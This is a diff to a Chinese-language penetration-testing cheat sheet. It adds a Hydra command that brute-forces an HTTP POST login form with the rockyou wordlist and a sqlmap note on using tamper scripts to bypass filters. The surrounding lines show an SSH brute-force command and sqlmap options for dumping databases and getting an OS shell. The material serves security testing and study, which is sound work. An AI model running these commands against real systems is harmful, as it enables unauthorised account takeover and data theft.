@@ -214,6 +214,11 @@ curl -XPOST -H "" -d '' http://ip:port/
 #-l指定用户名，-L指定用户名列表（用户名字典），-P指定密码列表（密码字典）
 #-t指定并行任务数，-W指定可等待连接的时间（超过即判定口令不对），-vV启用详细输出，-I跳过上次直接退出的恢复等待
 hydra -l username -P dictionary ssh://ip(:port)
+
+
+#用post方式爆破
+#:后边跟的是登录失败提示的错误消息，和每个网站的设计有关
+hydra -l root -P /usr/share/wordlists/rockyou.txt -t 64 192.168.6.158 http-post-form "/index.php:username=^USER^&password=^PASS^:Error with user or password"
 ```
 
 ## OpenSSL
@@ -267,7 +272,7 @@ sessions -i
 --purge:清除缓存
 --dump-all：获取数据库全部数据（慢）
 --shell-os:获取靶机shell
---
+--tamper=:绕过方式，默认位于/usr/share/sqlmap/tamper/
 
 -v  #详细的等级(0-6) 
     0：只显示Python的回溯，错误和关键消息。 
